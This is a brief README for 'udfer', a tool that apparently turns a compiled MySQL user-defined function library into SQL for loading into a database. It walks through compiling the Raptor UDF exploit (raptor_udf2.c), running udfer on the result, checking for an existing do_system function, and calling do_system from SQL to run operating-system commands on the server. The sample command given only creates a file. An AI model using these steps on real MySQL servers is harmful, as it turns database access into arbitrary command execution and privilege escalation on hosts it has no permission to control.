# udfer

./udfer /path/to/your/mysql/udf.so

My use case was the old Raptor UDF exploit, so:

~~~
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
./udfer /path/to/raptor_udf2.so
~~~

Before running the code this produces, ensure that the do_system UDF does not exist!

~~~
select * from mysql.func where name = 'do_system'
~~~

If it does exist and you run the command provided, you will clobber an existing function.

Run commands like this:
~~~
select do_system('touch /tmp/file.txt');
~~~